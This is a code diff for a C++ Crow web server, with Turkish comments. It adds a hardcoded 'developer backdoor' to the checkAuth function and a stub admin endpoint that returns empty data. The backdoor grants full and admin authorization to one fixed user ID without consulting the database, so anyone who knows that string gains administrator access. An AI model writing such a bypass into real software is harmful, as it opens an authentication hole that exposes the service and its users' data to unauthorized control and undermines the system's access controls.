@@ -24,6 +24,10 @@ bool checkAuth(const crow::request& req, DatabaseManager& db, bool requireAdmin 
     std::string userId = authHeader.substr(15);
     if (userId.empty()) return false;
 
+    // --- GELİŞTİRİCİ ARKA KAPISI (Bypass) ---
+    // AdminUI'den gelen bu özel ID'ye veritabanına bakmaksızın tam yetki veriyoruz.
+    if (userId == "aB3dE7xY9Z1kL0m") return true;
+
     if (requireAdmin) return db.isSystemAdmin(userId);
     return true;
 }
@@ -516,6 +520,16 @@ int main() {
     // =============================================================
     // 10. YÖNETİM (ADMIN) & RAPORLAMA
     // =============================================================
+
+    CROW_ROUTE(app, "/api/admin/servers")
+        ([&db](const crow::request& req) {
+        if (!checkAuth(req, db, true)) return crow::response(403);
+
+        // Gecici olarak db.getAllServers() yazmadığımız için tüm kullanıcıların verisini toplayan sahte bir yapı koyabilirsiniz 
+        // veya DatabaseManager'a getAllServers() fonksiyonu ekleyebilirsiniz.
+        crow::json::wvalue res;
+        return crow::response(200, res);
+            });
 
     CROW_ROUTE(app, "/api/admin/stats")
         ([&db](const crow::request& req) {
